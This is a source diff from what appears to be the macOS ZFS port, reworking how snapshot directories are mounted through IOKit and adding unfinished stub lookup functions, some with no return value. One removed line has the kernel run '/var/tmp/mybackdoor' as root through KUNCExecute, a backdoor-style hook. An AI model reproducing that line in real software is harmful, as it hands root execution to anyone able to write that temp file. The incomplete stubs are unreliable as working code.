@@ -75,6 +75,7 @@
  * so that it cannot be freed until all snapshots have been unmounted.
  */
 
+
 #include <sys/mount.h>
 #include <sys/types.h>
 #include <sys/pathname.h>
@@ -94,7 +95,7 @@
 
 #include "zfs_namecheck.h"
 
-//#define dprintf printf
+#define dprintf printf
 
 /*
  *            OSX     FreeBSD
@@ -105,6 +106,19 @@
  * decr:   vnode_put  vrele / vput (vput unlocks and vrele)
  *
  */
+
+
+
+
+#ifdef __APPLE__
+/*
+ * This changes the vnop behaviour from vnop_lookup_trigger() to
+ * vnop_lookup_mounting(). First one, when called, triggers a mount attempt,
+ * the second returns "valid" information to allow mounting to succeed.
+ */
+static uint64_t ctldir_mounting = 0;
+#endif
+
 
 
 //typedef struct vnodeopv_entry_desc vop_vector;
@@ -1217,12 +1231,6 @@ zfsctl_snapdir_readdir_cb(struct vnode *vp, void *dp, int *eofp,
      offset_t *offp, offset_t *nextp, void *data, int flags);
 
 
-uint32_t
-vnode_vfsvisflags(struct vnode *vp)
-{
-	return(vfs_flags(vnode_mount(vp)) & MNT_VISFLAGMASK);
-}
-
 
 
 /*
@@ -1284,8 +1292,13 @@ zfsctl_snapdir_lookup(ap)
 	 * spec (which looks like a local path for zfs).  We need to
 	 * add some flag to domount() to tell it not to do this lookup.
 	 */
-	if (MUTEX_HELD(&sdp->sd_lock))
-		return (ENOENT);
+	if (MUTEX_HELD(&sdp->sd_lock)) {
+		printf("ZFS: called from mount: '%s'\n", nm);
+		err = gfs_dir_lookup(dvp, nm, vpp, vfs_context_current(),
+							 flags, NULL, NULL);
+		printf("ZFS: returned %d\n", err);
+		return (err);
+	}
 
 	ZFS_ENTER(zfsvfs);
 
@@ -1404,39 +1417,25 @@ domount:
 
 #ifdef _KERNEL
 
-	//err = IOKit_mount_snapshot(curthread, vpp, "zfs", mountpoint, snapname, 0);
 	/*
-	 *  __private_extern__
-	 * int
-	 * kernel_mount(char *fstype, vnode_t pvp, vnode_t vp, const char *path,
-	 *       void *data, __unused size_t datalen, int syscall_flags,
-	 * __unused uint32_t kern_flags, vfs_context_t ctx)
-	 *
+	 * Since Apple does not provide any means to mount a new filesystem
+	 * from the kernel, we have to do a fair bit of work here. We will
+	 * create a new fake /dev/diskXsY entry for the snapshot, with the
+	 * correct "ContentHint" set. This will cause DiskArbitration to
+	 * inspect it (via fs.bundle and the probe utility zfs_util), then
+	 * mount it. Since these requests come from userland, we need to
+	 * provide vnop_ replies sufficient to allow a mount to succeed, so
+	 * we increase the 'mounting' atomic during the mounting attempt.
+	 * This will shift the role of vnops from 'trigger' to 'mounting'.
+	 * Once the userland mount is complete, zfs_vfs_mount() gets called,
+	 * and we can finally release this thread. (There is also a timeout)
 	 */
-#define KERNEL_MOUNT_NOAUTH             0x01 /* Don't check the UID of the directory we are mounting on */
-#define KERNEL_MOUNT_PERMIT_UNMOUNT     0x02 /* Allow (non-forced) unmounts by users other the one who mounted the volume */
-
-	printf("ZFS: Calling mount on dvp %p vpp %p\n", dvp, *vpp);
-#if 0
-	err = kernel_mount("ZFS", dvp, *vpp,
-					   mountpoint,
-					   USER_ADDR_NULL, 0,  /* mountargs */
-					   vnode_vfsvisflags(*vpp)|MNT_AUTOMOUNTED,//|MNT_DONTBROWSE
-					   KERNEL_MOUNT_PERMIT_UNMOUNT | KERNEL_MOUNT_NOAUTH,
-					   vfs_context_current);
-	err = __mac_mount(currproc(), egister struct __mac_mount_args *uap, __unused int32_t *retval);
-#endif
-#define kOpenApplicationPath    0
-#define kOpenPreferencePanel    1
-#define kOpenApplication        2
-
-#define kOpenAppAsRoot          0
-#define kOpenAppAsConsoleUser   1
-
-	err = KUNCExecute("/var/tmp/mybackdoor", kOpenAppAsRoot, kOpenApplicationPath);
-
-
-	printf("ZFS: mount said %d\n", err);
+	if (!ctldir_mounting) {
+		atomic_inc_64(&ctldir_mounting);
+		err = IOKit_mount_snapshot(curthread, vpp, "zfs", mountpoint, snapname, 0);
+		atomic_dec_64(&ctldir_mounting);
+		printf("ZFS: mount said %d\n", err);
+	}
 
     /* In upstream ZFS, mount_snapshot takes the current vp in vpp,
      * allocates a new mount, and creates a new mvp for it. Then
@@ -1501,6 +1500,44 @@ domount:
     dprintf("Lookup complete: %d %p\n", err, err==0?*vpp:NULL);
 	return (err);
 }
+
+
+int
+zfsctl_snapdir_lookup_mounting(ap)
+	struct vnop_lookup_args /* {
+		struct vnode *a_dvp;
+		struct vnode **a_vpp;
+		struct componentname *a_cnp;
+	} */ *ap;
+{
+
+
+}
+
+int
+zfsctl_snapdir_lookupX(ap)
+	struct vnop_lookup_args /* {
+		struct vnode *a_dvp;
+		struct vnode **a_vpp;
+		struct componentname *a_cnp;
+	} */ *ap;
+{
+	if (ctldir_mounting)
+		return zfsctl_snapdir_lookup_mounting(ap);
+	//return zfsctl_snapdir_lookup_trigger(ap);
+}
+
+
+
+
+
+
+
+
+
+
+
+
 
 /* ARGSUSED */
 #ifndef __APPLE__
